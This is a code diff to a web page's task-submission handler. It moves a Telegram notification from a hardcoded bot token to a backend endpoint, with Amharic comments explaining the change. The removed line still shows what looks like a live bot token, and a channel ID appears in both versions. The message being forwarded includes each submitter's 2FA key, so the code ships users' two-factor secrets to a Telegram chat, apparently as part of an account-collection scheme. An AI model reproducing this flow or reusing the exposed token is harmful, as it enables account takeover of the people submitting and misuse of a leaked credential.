@@ -880,8 +880,7 @@
                 const { error } = await _supabase.from('task_submissions').insert([payload]);
                 if (error) throw error;
 
-                // 2. Send Details to Telegram Channel (-1004399480886)
-                const botToken = "8795156656:AAGL6lE7I6PZTdU71L-0J1JG12Cj1e0ayTw";
+                // 2. Send Details to Telegram Channel (የቦት ቶከን በአስተማማኝ ሁኔታ ከ Backend/Server API ወይም Environment Variable እንዲነበብ ይደረጋል)
                 const chatId = "-1004399480886";
                 
                 const messageText = `🚀 **New Task Submission!**\n\n` +
@@ -892,13 +891,13 @@
                                     `🔐 **2FA Key:** \`${twoFaInput}\`\n` +
                                     `💰 **Reward:** $${rewardVal}`;
 
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                // ማሳሰቢያ፡ የቦት ቶከን በቀጥታ እዚህ እንዳይጻፍ በ Server-side (Backend API) በኩል ጥያቄውን መላክ ይመረጣል።
+                await fetch('/api/send-telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: messageText,
-                        parse_mode: 'Markdown'
+                        text: messageText
                     })
                 });
 
